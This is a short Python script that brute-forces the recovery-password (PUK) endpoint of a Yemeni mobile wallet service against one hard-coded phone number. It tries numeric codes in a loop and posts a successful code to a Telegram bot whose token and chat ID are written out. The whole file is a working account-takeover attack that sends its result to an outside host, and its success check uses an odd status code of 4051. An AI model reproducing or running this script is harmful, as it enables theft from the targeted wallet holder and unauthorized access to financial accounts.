import requests
import time
url = "https://app.jawali-ye.com.ye:8473/walletmobileproxy/v1/user/verifypuk"
headers = {"Content-Type": "application/json"}
TOKEN = "9252397028:AAE4kzmZYeIKJuWVdeRiy7Ai5KocsT4xWro"
CHAT_ID = 6263683593
url2 = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
target_phone = "772490746"
for i in range(9999999):
    time.sleep(0.25)
    zee =100000
    data = {
        "username": target_phone,"recoveryPassword": zee + i
        
         }
    response = requests.post(url, json=data,headers=headers, verify=True)
    d = {
    "chat_id": CHAT_ID,
    "text": zee +i   
    
}
    if response.status_code == 4051:
        r = requests.post(url2, data=d, timeout=10)
        print(response.status_code,data)
        break
    print(response.status_code,data)
